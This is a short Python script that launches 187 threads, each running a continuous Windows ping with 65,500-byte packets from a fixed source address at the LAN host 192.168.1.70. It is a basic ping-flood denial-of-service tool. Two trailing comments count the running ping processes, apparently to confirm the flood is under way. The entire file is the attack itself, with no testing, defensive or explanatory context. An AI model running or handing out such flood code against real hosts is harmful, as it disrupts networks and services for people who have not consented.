import subprocess
import threading

def send_ping(ip_dest,ip_src,sent_buff_size):
    subprocess.run(f'ping -l {sent_buff_size} -t {ip_dest} -S {ip_src}', stdout=subprocess.DEVNULL)

def main():
    ip_destination = '192.168.1.70'
    ip_source = '192.168.1.35'
    sent_buff_size = 65500
    num_threads = 187

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_ping, args=(ip_destination,ip_source,sent_buff_size))
        threads.append(thread)
        thread.start()
    print('Running')
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
    
#tasklist /FI "IMAGENAME eq ping.exe" | find /c "PING.EXE"
#tasklist /FI "IMAGENAME eq ping.exe"